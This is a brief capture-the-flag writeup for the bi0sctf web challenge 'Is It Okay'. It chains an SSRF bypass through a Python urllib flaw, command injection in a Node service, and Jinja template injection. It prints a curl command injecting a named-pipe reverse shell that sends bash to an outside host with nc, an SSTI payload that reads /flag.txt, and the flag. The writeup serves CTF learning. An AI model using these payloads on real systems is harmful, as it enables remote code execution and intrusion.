# Is It Okay

### Challenge description

Is this really ok......

### Short Writeup

#### I'st part

-> Fuzzing to get the /internal endpoint 

-> On giving a malformed url, you can see the urllib error, so the backend is making a request using the inbuilt urllib module.

-> The reponse headers give out the python version, which is 3.11.3 combining the points they'll get a CVE, which is used bypass block restrictions by appending a whitespace at the start of a url, hence they can now send requests to the internal registry network.


####  II'nd part

-> They'll have to write a script to automate the download repos from the registry.

-> Once they have the source code, on looking at the source code of the node app they'll see that it is using the network module to get details of the gateway ip.

-> This is a custom gadget but can be easily found out by looking at the source code. Using the following payload they can get RCE on the server

```
 curl "http://localhost:1111/custom/?interface=| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.113.21.179 5001 >/tmp/f #"
 ```


####  III'rd part

-> Once they have reverse shell, on doing lsblk they can see that the /app/templates folder is mounted from the host's machine. 

-> You can also see that templates auto reload on the core service's source code.

-> Combining the above two points they you can figure out that the template folder that flask uses is mounted from the host on to both of the services, ie Vec and Core. So on modifying index.html in the templates folder from the node service it will also reflect on the core service and also on the host. The SSTI payload is as follows:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

-> Just reload the main page and you'll get the flag.

### Flag

bi0sctf{S4f3?_Y0u_G0tt4_B3_kidding_M3_l0l}

### Author

[Winters](https://twitter.com/ArunKr1shnan)